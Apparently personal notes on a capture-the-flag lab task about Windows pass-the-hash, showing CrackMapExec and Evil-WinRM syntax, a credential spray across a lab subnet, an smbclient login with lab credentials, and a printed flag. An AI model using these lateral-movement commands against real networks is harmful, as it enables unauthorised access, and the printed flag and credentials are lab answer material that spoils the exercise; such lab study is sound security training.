If cracking the hash fails, we always know that there is a backup when operating in Windows. Windows allows functionality to pass a hash to WinRM and RDP to enable authentication. This gives us as attackers an advantage, getting rid of the need to crack hashes. This attack is known as pass-the-hash.  

Pass the hash (PtH) is an attack wherein we can leverage found NTLM or LanMan hashes of user passwords to authenticate the user they belong to. This is possible due to the well-intentioned security 'feature' within Windows, where passwords are hashed predictably before being sent over the network. Done originally with the intent of avoiding password disclosure, we can leverage this feature to capture and replay hashes, allowing us to authenticate as our victim users.  

To aid us in passing the hash, we can use crackmapexec and Evil-WinRM.  

## CrackMapExec

The first tool we will be looking at is crackmapexec, [https://github.com/byt3bl33d3r/CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec). 

From the crackmapexec GitHub, *"CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. Built with stealth in mind, CME follows the concept of "Living off the Land": abusing built-in Active Directory features/protocols to achieve its functionality and allowing it to evade most endpoint protection/IDS/IPS solutions."* We will be using only one of the many features of CME. We can pass the hash over SMB, SSH, WinRM, LDAP, or MSSQL; we recommend using SMB.

  
We will be deploying CME across the entire CIDR subnet to identify endpoints in which the credentials successfully authenticate. Find syntax usage for CME below.  

Syntax: `crackmapexec smb 10.200.x.0/24 -u <user> -d <domain> -H <hash>`

Above you will see crackmapexec output over proxy chains. Crackmapexec can take a decent amount of time when operating over proxy chains.  

For more information about crackmapexec check out the GitHub wiki, [https://github.com/byt3bl33d3r/CrackMapExec/wiki](https://github.com/byt3bl33d3r/CrackMapExec/wiki).  

---

## Evil-WinRM

The second tool we will be looking at is Evil-WinRM, [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm). This tool will abuse the WinRM protocol to communicate to a remote endpoint. From the Evil-WinRM GitHub *"WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP-based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems to make life easier to system administrators."*  Thus, we can use our previously found endpoint and our hash and username to authenticate to the server and gain remote access successfully.  

The easiest way to install Evil-WinRM is to install from the gem package manager, as the tool is built in Ruby. Find the command to install Evil-WinRM below.  

Command: `gem install evil-winrm`

After the installation, it is relatively simple to use Evil-WinRM as it operates similarly to other RDP or SSH clients. Find the Evil-WinRM syntax below.  

Syntax: `evil-winrm -i <address> -u <user> -H <hash>`

If successfully authenticated, you should now have a working WinRM shell that you can use to execute remote commands.


---

# Your job

## CrackMapExec

### Install from GitHub Repository

1. **Clone the CrackMapExec Repository**:

    `git clone --recursive https://github.com/Porchetta-Industries/CrackMapExec cd CrackMapExec`
    
2. **Install CrackMapExec via pip**:
   
    `python3 -m pip install .`
    
3. **Verify the Installation**:

    `crackmapexec --version`

### Running


> [!warning]
> Remember you must have **sshutle** running to access these machines.


On your attacking machine run:

```
crackmapexec smb 10.200.110.0/24 -u 'watamet' -p 'Nothingtoworry!'
```

![[Task 37 - Good Intentions, Courtesy of Microsoft - Part II-20241105150502280.webp]]

- You see we have the Domain Name `holo.live`.
- The machines that have SMB port open and enabled. 
- You also see their OS information `Windows 10` . 
- From here you also found out `10.200.X.30` is the DC or Domain Controller.
- You have already compromised the `10.200.X.31` which is the `S-SRV01`.
- You can login to PC-FILESRV01, DC-SRV01 and S-SRV01.

### Connect to PC-FILESRV01 with smbclient

Using watamet's credentials connect via smbclient.

```
smbclient -U 'HOLO.LIVE\watamet%Nothingtoworry!' //10.200.110.35/Users 
```

## Flag on PC-FILESRV01

- Get the flag.

```
cat 'watamet\Desktop\user.txt' 
```

HOLO{2cb097ab8c412d565ec3cab49c6b082e} 

Submit the user flag in Task 4, question 6.

**Next step:** [[Task 38 - Watson left her locker open]]
